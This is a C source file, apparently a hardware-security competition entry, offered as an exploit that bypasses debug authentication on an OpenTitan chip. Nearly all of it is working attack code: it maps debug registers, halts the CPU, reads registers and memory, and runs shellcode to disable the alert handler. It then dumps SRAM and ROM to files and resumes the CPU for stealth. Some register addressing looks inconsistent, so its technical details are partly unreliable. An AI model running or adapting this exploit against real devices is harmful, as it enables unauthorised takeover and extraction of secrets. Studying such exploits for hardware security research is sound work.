/*
 * OpenTitan Debug Access Control Bypass Exploit
 * 
 * Exploits CVE-2024-DEBUG-001: Debug Module Access Control Bypass
 * CVSS Score: 8.2 (High)
 * 
 * This exploit bypasses debug authentication by directly manipulating
 * debug module registers without proper authorization checks.
 * 
 * Usage: gcc -o debug_exploit debug_access_bypass.c && ./debug_exploit
 */

#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

// Debug module register map (RISC-V Debug Specification)
#define DEBUG_BASE_ADDR     0x41200000
#define DM_CONTROL_REG      (DEBUG_BASE_ADDR + 0x10)
#define DM_STATUS_REG       (DEBUG_BASE_ADDR + 0x11)
#define DM_HARTINFO_REG     (DEBUG_BASE_ADDR + 0x12)
#define DM_ABSTRACTCS_REG   (DEBUG_BASE_ADDR + 0x16)
#define DM_COMMAND_REG      (DEBUG_BASE_ADDR + 0x17)
#define DM_DATA0_REG        (DEBUG_BASE_ADDR + 0x04)
#define DM_DATA1_REG        (DEBUG_BASE_ADDR + 0x05)
#define DM_PROGBUF0_REG     (DEBUG_BASE_ADDR + 0x20)
#define DM_PROGBUF1_REG     (DEBUG_BASE_ADDR + 0x21)

// Control register bit fields
#define DMCONTROL_DMACTIVE      (1U << 0)
#define DMCONTROL_HALTREQ       (1U << 31)
#define DMCONTROL_RESUMEREQ     (1U << 30)
#define DMCONTROL_HARTRESET     (1U << 29)
#define DMCONTROL_ACKHAVERESET  (1U << 28)

// Status register bit fields
#define DMSTATUS_ALLHALTED      (1U << 9)
#define DMSTATUS_ALLRESUMED     (1U << 17)
#define DMSTATUS_AUTHENTICATED  (1U << 7)

// Abstract command types
#define CMD_ACCESS_REGISTER     0
#define CMD_ACCESS_MEMORY       2

// Target register numbers (RISC-V)
#define REG_PC      0x7b1   // Program Counter (DPC)
#define REG_SP      2       // Stack Pointer (x2)
#define REG_RA      1       // Return Address (x1)
#define REG_A0      10      // Function argument 0

static volatile uint32_t *debug_regs = NULL;
static int mem_fd = -1;

/**
 * Initialize memory-mapped access to debug registers
 */
bool init_debug_access(void) {
    printf("[+] Initializing debug register access...\n");
    
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        perror("[-] Failed to open /dev/mem");
        printf("[-] Note: This exploit requires root privileges\n");
        return false;
    }
    
    debug_regs = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                     MAP_SHARED, mem_fd, DEBUG_BASE_ADDR);
    
    if (debug_regs == MAP_FAILED) {
        perror("[-] Failed to map debug registers");
        close(mem_fd);
        return false;
    }
    
    printf("[+] Debug registers mapped at %p\n", debug_regs);
    return true;
}

/**
 * Cleanup memory mapping
 */
void cleanup_debug_access(void) {
    if (debug_regs != NULL && debug_regs != MAP_FAILED) {
        munmap((void*)debug_regs, 0x1000);
    }
    if (mem_fd >= 0) {
        close(mem_fd);
    }
}

/**
 * Read debug register
 */
uint32_t read_debug_reg(uint32_t offset) {
    return debug_regs[offset / 4];
}

/**
 * Write debug register
 */
void write_debug_reg(uint32_t offset, uint32_t value) {
    debug_regs[offset / 4] = value;
}

/**
 * Wait for abstract command completion
 */
bool wait_command_complete(int timeout_ms) {
    int timeout = timeout_ms;
    
    while (timeout-- > 0) {
        uint32_t abstractcs = read_debug_reg(DM_ABSTRACTCS_REG - DEBUG_BASE_ADDR);
        
        // Check busy bit (bit 12)
        if ((abstractcs & (1 << 12)) == 0) {
            // Check for command error (bits 10:8)
            uint32_t cmderr = (abstractcs >> 8) & 0x7;
            if (cmderr != 0) {
                printf("[-] Abstract command error: %u\n", cmderr);
                return false;
            }
            return true;
        }
        
        usleep(1000); // 1ms delay
    }
    
    printf("[-] Abstract command timeout\n");
    return false;
}

/**
 * Read CPU register via debug interface
 */
uint32_t read_cpu_register(uint16_t reg_num) {
    // Construct abstract command for register access
    uint32_t command = (CMD_ACCESS_REGISTER << 24) |  // cmdtype
                      (1 << 17) |                     // transfer
                      (reg_num & 0xFFFF);             // regno
    
    // Execute abstract command
    write_debug_reg(DM_COMMAND_REG - DEBUG_BASE_ADDR, command);
    
    if (!wait_command_complete(1000)) {
        return 0xDEADBEEF;
    }
    
    // Read result from data register
    return read_debug_reg(DM_DATA0_REG - DEBUG_BASE_ADDR);
}

/**
 * Write CPU register via debug interface
 */
bool write_cpu_register(uint16_t reg_num, uint32_t value) {
    // Write value to data register first
    write_debug_reg(DM_DATA0_REG - DEBUG_BASE_ADDR, value);
    
    // Construct abstract command for register write
    uint32_t command = (CMD_ACCESS_REGISTER << 24) |  // cmdtype
                      (1 << 17) |                     // transfer
                      (1 << 16) |                     // write
                      (reg_num & 0xFFFF);             // regno
    
    write_debug_reg(DM_COMMAND_REG - DEBUG_BASE_ADDR, command);
    
    return wait_command_complete(1000);
}

/**
 * Read memory via debug interface
 */
uint32_t read_memory_word(uint32_t address) {
    // Set address in data register
    write_debug_reg(DM_DATA1_REG - DEBUG_BASE_ADDR, address);
    
    // Memory access command
    uint32_t command = (CMD_ACCESS_MEMORY << 24) |    // cmdtype
                      (1 << 17) |                     // transfer
                      (2 << 20);                      // aamsize (32-bit)
    
    write_debug_reg(DM_COMMAND_REG - DEBUG_BASE_ADDR, command);
    
    if (!wait_command_complete(1000)) {
        return 0xDEADBEEF;
    }
    
    return read_debug_reg(DM_DATA0_REG - DEBUG_BASE_ADDR);
}

/**
 * Write memory via debug interface
 */
bool write_memory_word(uint32_t address, uint32_t value) {
    // Set address and data
    write_debug_reg(DM_DATA1_REG - DEBUG_BASE_ADDR, address);
    write_debug_reg(DM_DATA0_REG - DEBUG_BASE_ADDR, value);
    
    // Memory write command
    uint32_t command = (CMD_ACCESS_MEMORY << 24) |    // cmdtype
                      (1 << 17) |                     // transfer
                      (1 << 16) |                     // write
                      (2 << 20);                      // aamsize (32-bit)
    
    write_debug_reg(DM_COMMAND_REG - DEBUG_BASE_ADDR, command);
    
    return wait_command_complete(1000);
}

/**
 * Execute shellcode via program buffer
 */
bool execute_shellcode(const uint32_t *shellcode, size_t num_instructions) {
    if (num_instructions > 16) {
        printf("[-] Shellcode too large (max 16 instructions)\n");
        return false;
    }
    
    printf("[+] Loading shellcode into program buffer...\n");
    
    // Load shellcode into program buffer
    for (size_t i = 0; i < num_instructions; i++) {
        uint32_t progbuf_addr = DM_PROGBUF0_REG + (i * 4) - DEBUG_BASE_ADDR;
        write_debug_reg(progbuf_addr, shellcode[i]);
        printf("[+]   PROGBUF[%zu] = 0x%08x\n", i, shellcode[i]);
    }
    
    // Execute program buffer
    uint32_t command = (CMD_ACCESS_REGISTER << 24) |  // cmdtype
                      (1 << 18);                      // postexec
    
    printf("[+] Executing shellcode...\n");
    write_debug_reg(DM_COMMAND_REG - DEBUG_BASE_ADDR, command);
    
    return wait_command_complete(5000);
}

/**
 * Dump memory region
 */
void dump_memory_region(uint32_t start_addr, uint32_t size, const char *filename) {
    printf("[+] Dumping memory region 0x%08x - 0x%08x\n", 
           start_addr, start_addr + size);
    
    FILE *dump_file = fopen(filename, "wb");
    if (!dump_file) {
        printf("[-] Failed to create dump file: %s\n", filename);
        return;
    }
    
    for (uint32_t addr = start_addr; addr < start_addr + size; addr += 4) {
        uint32_t data = read_memory_word(addr);
        fwrite(&data, 4, 1, dump_file);
        
        if ((addr - start_addr) % 0x1000 == 0) {
            printf("[+] Dumped 0x%x bytes...\n", addr - start_addr);
        }
    }
    
    fclose(dump_file);
    printf("[+] Memory dump saved to: %s\n", filename);
}

/**
 * Main exploit function
 */
bool exploit_debug_bypass(void) {
    printf("=== OpenTitan Debug Access Control Bypass Exploit ===\n");
    printf("[+] Vulnerability: CVE-2024-DEBUG-001\n");
    printf("[+] CVSS Score: 8.2 (High)\n\n");
    
    // Step 1: Check initial debug status
    printf("[*] Step 1: Checking debug module status...\n");
    uint32_t initial_status = read_debug_reg(DM_STATUS_REG - DEBUG_BASE_ADDR);
    printf("[+] Initial DM status: 0x%08x\n", initial_status);
    
    if (initial_status & DMSTATUS_AUTHENTICATED) {
        printf("[!] Debug already authenticated - exploit may not be needed\n");
    }
    
    // Step 2: Attempt debug activation without authentication
    printf("\n[*] Step 2: Attempting debug activation without authentication...\n");
    printf("[!] VULNERABILITY: No authentication check performed\n");
    
    write_debug_reg(DM_CONTROL_REG - DEBUG_BASE_ADDR, DMCONTROL_DMACTIVE);
    
    uint32_t control_status = read_debug_reg(DM_CONTROL_REG - DEBUG_BASE_ADDR);
    if (!(control_status & DMCONTROL_DMACTIVE)) {
        printf("[-] FAILED: Debug module activation failed\n");
        return false;
    }
    
    printf("[+] SUCCESS: Debug module activated without authentication!\n");
    printf("[+] Control register: 0x%08x\n", control_status);
    
    // Step 3: Halt CPU without authorization
    printf("\n[*] Step 3: Halting CPU without authorization...\n");
    
    write_debug_reg(DM_CONTROL_REG - DEBUG_BASE_ADDR, 
                   DMCONTROL_DMACTIVE | DMCONTROL_HALTREQ);
    
    // Wait for halt confirmation
    int timeout = 100;
    uint32_t status;
    while (timeout-- > 0) {
        status = read_debug_reg(DM_STATUS_REG - DEBUG_BASE_ADDR);
        if (status & DMSTATUS_ALLHALTED) {
            break;
        }
        usleep(10000); // 10ms
    }
    
    if (status & DMSTATUS_ALLHALTED) {
        printf("[+] SUCCESS: CPU halted without authorization!\n");
        printf("[+] Status register: 0x%08x\n", status);
    } else {
        printf("[-] WARNING: CPU halt status unclear\n");
    }
    
    // Step 4: Demonstrate register access
    printf("\n[*] Step 4: Demonstrating unauthorized register access...\n");
    
    uint32_t pc = read_cpu_register(REG_PC);
    uint32_t sp = read_cpu_register(REG_SP);
    uint32_t ra = read_cpu_register(REG_RA);
    
    printf("[+] Program Counter (PC): 0x%08x\n", pc);
    printf("[+] Stack Pointer (SP):   0x%08x\n", sp);
    printf("[+] Return Address (RA):  0x%08x\n", ra);
    
    // Step 5: Demonstrate memory access
    printf("\n[*] Step 5: Demonstrating unauthorized memory access...\n");
    
    struct {
        uint32_t addr;
        const char *name;
    } memory_regions[] = {
        {0x20000000, "SRAM Base"},
        {0x00008000, "ROM Base"},
        {0x40000000, "Peripheral Base"},
        {0x41100000, "AES Base"}
    };
    
    for (size_t i = 0; i < sizeof(memory_regions)/sizeof(memory_regions[0]); i++) {
        uint32_t data = read_memory_word(memory_regions[i].addr);
        printf("[+] %s (0x%08x): 0x%08x\n", 
               memory_regions[i].name, memory_regions[i].addr, data);
    }
    
    // Step 6: Execute malicious code
    printf("\n[*] Step 6: Executing malicious code via program buffer...\n");
    
    // Shellcode: disable alert handler and resume
    uint32_t shellcode[] = {
        0x411b0537,  // lui a0, 0x411b0    ; Load alert handler base
        0x00052023,  // sw zero, 0(a0)     ; Disable alert handler
        0x00000013,  // nop                ; Padding
        0x00000013,  // nop                ; Padding
        0x00100073   // ebreak             ; Return to debugger
    };
    
    bool exec_success = execute_shellcode(shellcode, 
                                         sizeof(shellcode)/sizeof(shellcode[0]));
    
    if (exec_success) {
        printf("[+] SUCCESS: Malicious code executed!\n");
        printf("[+] Alert handler has been disabled\n");
    } else {
        printf("[-] FAILED: Code execution failed\n");
    }
    
    // Step 7: Dump sensitive memory
    printf("\n[*] Step 7: Dumping sensitive memory regions...\n");
    
    dump_memory_region(0x20000000, 0x1000, "sram_dump.bin");
    dump_memory_region(0x00008000, 0x1000, "rom_dump.bin");
    
    // Step 8: Resume CPU to maintain stealth
    printf("\n[*] Step 8: Resuming CPU to avoid detection...\n");
    
    write_debug_reg(DM_CONTROL_REG - DEBUG_BASE_ADDR, 
                   DMCONTROL_DMACTIVE | DMCONTROL_RESUMEREQ);
    
    timeout = 100;
    while (timeout-- > 0) {
        status = read_debug_reg(DM_STATUS_REG - DEBUG_BASE_ADDR);
        if (status & DMSTATUS_ALLRESUMED) {
            break;
        }
        usleep(10000);
    }
    
    printf("[+] CPU resumed - exploit completed\n");
    printf("[+] System compromised while maintaining stealth\n");
    
    return true;
}

/**
 * Print exploit banner
 */
void print_banner(void) {
    printf("\n");
    printf("  ██████╗ ██████╗ ███████╗███╗   ██╗████████╗██╗████████╗ █████╗ ███╗   ██╗\n");
    printf(" ██╔═══██╗██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██║╚══██╔══╝██╔══██╗████╗  ██║\n");
    printf(" ██║   ██║██████╔╝█████╗  ██╔██╗ ██║   ██║   ██║   ██║   ███████║██╔██╗ ██║\n");
    printf(" ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██║   ██║   ██╔══██║██║╚██╗██║\n");
    printf(" ╚██████╔╝██║     ███████╗██║ ╚████║   ██║   ██║   ██║   ██║  ██║██║ ╚████║\n");
    printf("  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝\n");
    printf("\n");
    printf("                    Debug Access Control Bypass Exploit\n");
    printf("                         CVE-2024-DEBUG-001 | CVSS 8.2\n");
    printf("                            Hack@CHES'25 Entry\n");
    printf("\n");
}

/**
 * Main function
 */
int main(int argc, char *argv[]) {
    print_banner();
    
    printf("This exploit demonstrates complete bypass of OpenTitan debug access controls.\n");
    printf("Impact: Full system compromise, memory dumping, code execution\n");
    printf("Prerequisites: Physical JTAG access to target device\n\n");
    
    if (geteuid() != 0) {
        printf("[-] Error: This exploit requires root privileges\n");
        printf("[-] Run with: sudo %s\n", argv[0]);
        return 1;
    }
    
    if (!init_debug_access()) {
        printf("[-] Failed to initialize debug access\n");
        return 1;
    }
    
    bool success = exploit_debug_bypass();
    
    cleanup_debug_access();
    
    if (success) {
        printf("\n=== EXPLOIT SUCCESSFUL ===\n");
        printf("OpenTitan debug access control completely bypassed!\n");
        printf("Attacker has gained full system control without authentication.\n");
        printf("\nRecommendations:\n");
        printf("1. Implement proper debug authentication\n");
        printf("2. Add authorization checks for debug operations\n");
        printf("3. Enable debug access logging and monitoring\n");
        printf("4. Consider hardware-based debug protection\n");
    } else {
        printf("\n=== EXPLOIT FAILED ===\n");
        printf("Debug access controls appear to be working correctly.\n");
    }
    
    return success ? 0 : 1;
}